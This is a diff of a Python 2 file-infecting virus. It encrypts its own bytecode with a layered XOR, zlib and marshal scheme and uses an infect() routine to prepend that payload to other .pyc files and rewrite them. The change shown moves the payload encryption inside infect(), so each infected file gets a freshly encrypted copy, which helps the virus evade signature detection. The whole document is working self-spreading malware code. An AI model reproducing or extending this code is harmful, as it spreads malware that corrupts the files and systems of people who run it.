@@ -6,12 +6,10 @@ import marshal
 import zlib
 import glob
 from base64 import b64decode, b64encode
-import random
 
-crypt=None
-DECRYPT=None
+crypt = None
+DECRYPT = None
 exec b64decode("__XOR_LAYER_PY__")
-
 
 if __file__.endswith('.pyc'):
     template = b64decode("__TEMPLATE_PY__")
@@ -36,16 +34,14 @@ if __file__.endswith('.pyc'):
         if type(data.code[i][1]) == type('') and data.code[i][1] == __py_version__: #signature
             EXPLOIT_SIZE = i + 2
             break
-    #if not EXPLOIT_SIZE:
-        #print "EXPLOIT_SIZE not found"
+            #if not EXPLOIT_SIZE:
+            #print "EXPLOIT_SIZE not found"
 
     data.code = data.code[:EXPLOIT_SIZE]
     data.code.append((LOAD_CONST, None))
     data.code.append((RETURN_VALUE, None))
-    payload = b64encode(crypt(zlib.compress(marshal.dumps(data.to_code()))))
-    template = template.replace("__PAYLOAD_PLACEHOLDER__", payload)
-    payload = Code.from_code(compile(template, "", "exec")).code
-    payload = CodeList(payload[:-2])
+    payload_clear = zlib.compress(marshal.dumps(data.to_code()))
+
 
     # ------------- GENERATING PAYLOAD DATA ---------------
     def infect(f_to_infect):
@@ -63,6 +59,10 @@ if __file__.endswith('.pyc'):
 
         f.close()
 
+        payload = b64encode(crypt(payload_clear))
+        template_for_this_inject = template.replace("__PAYLOAD_PLACEHOLDER__", payload)
+        payload = Code.from_code(compile(template_for_this_inject, "", "exec")).code
+        payload = payload[:-2]
         data.code[:0] = payload
 
         newfile = open(f_to_infect, 'w')
